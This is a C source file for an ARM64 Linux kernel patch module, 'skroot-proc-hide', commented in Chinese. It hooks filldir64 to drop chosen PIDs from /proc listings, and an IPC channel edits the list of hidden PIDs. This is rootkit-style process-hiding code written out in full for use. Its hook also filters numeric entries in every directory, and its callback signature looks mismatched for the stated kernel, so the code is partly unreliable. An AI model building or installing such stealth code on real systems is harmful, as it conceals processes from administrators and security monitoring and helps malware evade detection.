/*
 * skroot-proc-hide - KPM 进程隐藏模块
 *
 * 功能：从 /proc 目录中隐藏指定进程，使 ps、top 等工具看不到。
 *
 * 原理：
 *   hook filldir64 回调，当 /proc 下的数字目录名
 *   对应的 PID 在隐藏列表中时，跳过该条目。
 *
 * 使用方式：
 *   通过 IPC 通道 "proc_hide" 控制：
 *   - 发送 "+<pid>" 添加隐藏 PID
 *   - 发送 "-<pid>" 移除隐藏 PID
 *   - 发送 "list" 列出当前隐藏的 PID
 *   - 发送 "clear" 清空隐藏列表
 *
 * Target: ARM64, Linux kernel 6.6
 */

#include <kpmodule.h>
#include <hook.h>
#include <kallsyms.h>
#include <kpmlog.h>
#include <kpmipc.h>

KPM_NAME("skroot-proc-hide");
KPM_VERSION("1.0.0");
KPM_LICENSE("GPL");
KPM_AUTHOR("SKRoot");
KPM_DESCRIPTION("Hide processes from /proc listing");

/* ── 隐藏 PID 列表 ─────────────────────────────────────────*/
#define MAX_HIDDEN_PIDS 64

static int hidden_pids[MAX_HIDDEN_PIDS];
static int hidden_count = 0;

/* ── 辅助函数 ───────────────────────────────────────────────*/

static int kpm_atoi(const char *s)
{
    int val = 0;
    int neg = 0;
    if (*s == '-') { neg = 1; s++; }
    else if (*s == '+') { s++; }
    while (*s >= '0' && *s <= '9') {
        val = val * 10 + (*s - '0');
        s++;
    }
    return neg ? -val : val;
}

static int kpm_memcmp(const void *a, const void *b, unsigned long n)
{
    const unsigned char *p1 = (const unsigned char *)a;
    const unsigned char *p2 = (const unsigned char *)b;
    unsigned long i;
    for (i = 0; i < n; i++) {
        if (p1[i] != p2[i]) return (int)p1[i] - (int)p2[i];
    }
    return 0;
}

static int is_pid_hidden(int pid)
{
    int i;
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) return 1;
    }
    return 0;
}

static int is_numeric(const char *s, int len)
{
    int i;
    if (len <= 0) return 0;
    for (i = 0; i < len; i++) {
        if (s[i] < '0' || s[i] > '9') return 0;
    }
    return 1;
}

/* ── Hook: /proc 目录遍历 ──────────────────────────────────*/

typedef int (*filldir_t)(void *ctx, const char *name, int namlen,
                         long long offset, unsigned long long ino,
                         unsigned int d_type);

static filldir_t orig_proc_filldir = 0;
static void *proc_filldir_addr = 0;

static int hook_proc_filldir(void *ctx, const char *name, int namlen,
                             long long offset, unsigned long long ino,
                             unsigned int d_type)
{
    if (hidden_count > 0 && is_numeric(name, namlen)) {
        int pid = kpm_atoi(name);
        if (is_pid_hidden(pid)) {
            return 0;
        }
    }
    return orig_proc_filldir(ctx, name, namlen, offset, ino, d_type);
}

/* ── IPC 处理 ───────────────────────────────────────────────*/

static long ipc_handler(void *data, int data_len)
{
    const char *cmd = (const char *)data;
    int i;

    if (!cmd || data_len <= 0) return -1;

    if (cmd[0] == '+') {
        int pid = kpm_atoi(cmd + 1);
        if (pid <= 0) return -1;
        if (is_pid_hidden(pid)) return 0;
        if (hidden_count >= MAX_HIDDEN_PIDS) return -1;
        hidden_pids[hidden_count++] = pid;
        kpm_logi("proc-hide: added PID %d (total: %d)\n", pid, hidden_count);
        return 0;
    }

    if (cmd[0] == '-' && cmd[1] >= '0' && cmd[1] <= '9') {
        int pid = kpm_atoi(cmd + 1);
        for (i = 0; i < hidden_count; i++) {
            if (hidden_pids[i] == pid) {
                hidden_pids[i] = hidden_pids[hidden_count - 1];
                hidden_count--;
                kpm_logi("proc-hide: removed PID %d (total: %d)\n", pid, hidden_count);
                return 0;
            }
        }
        return -1;
    }

    if (data_len >= 5 && kpm_memcmp(cmd, "clear", 5) == 0) {
        hidden_count = 0;
        kpm_logi("proc-hide: cleared all hidden PIDs\n");
        return 0;
    }

    if (data_len >= 4 && kpm_memcmp(cmd, "list", 4) == 0) {
        for (i = 0; i < hidden_count; i++) {
            kpm_logi("proc-hide: hidden[%d] = PID %d\n", i, hidden_pids[i]);
        }
        return hidden_count;
    }

    return -1;
}

/* ── 模块初始化 ─────────────────────────────────────────────*/

static long proc_hide_init(const char *args, const char *event, void *reserved)
{
    void *trampoline;
    (void)args; (void)event; (void)reserved;

    kpm_logi("proc-hide: initializing...\n");

    proc_filldir_addr = (void *)kallsyms_lookup_name("filldir64");
    if (!proc_filldir_addr) {
        kpm_loge("proc-hide: failed to resolve filldir64\n");
        return -1;
    }

    trampoline = hook(proc_filldir_addr, (void *)hook_proc_filldir,
                      (void **)&orig_proc_filldir);
    if (!trampoline) {
        kpm_loge("proc-hide: failed to hook filldir64\n");
        return -1;
    }

    kpm_logi("proc-hide: filldir64 hooked at %p\n", proc_filldir_addr);

    if (kpm_ipc_register("proc_hide", ipc_handler) != 0) {
        kpm_logw("proc-hide: failed to register IPC channel\n");
    }

    kpm_logi("proc-hide: initialized\n");
    return 0;
}

static long proc_hide_exit(void *reserved)
{
    (void)reserved;
    kpm_logi("proc-hide: unloading...\n");

    kpm_ipc_unregister("proc_hide");

    if (proc_filldir_addr) {
        unhook(proc_filldir_addr);
        proc_filldir_addr = 0;
        orig_proc_filldir = 0;
    }

    hidden_count = 0;
    kpm_logi("proc-hide: unloaded\n");
    return 0;
}

KPM_INIT(proc_hide_init);
KPM_EXIT(proc_hide_exit);
